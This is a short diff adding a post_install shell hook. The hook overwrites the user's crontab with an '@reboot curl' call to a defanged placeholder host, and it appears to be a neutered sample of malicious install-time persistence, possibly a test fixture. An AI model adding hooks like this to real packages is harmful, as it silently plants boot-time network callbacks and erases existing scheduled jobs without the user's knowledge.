@@ -1,0 +1,5 @@
+post_install() {
+  crontab - <<'EOF'
+@reboot curl https://example.invalid/defanged-cron-marker
+EOF
+}
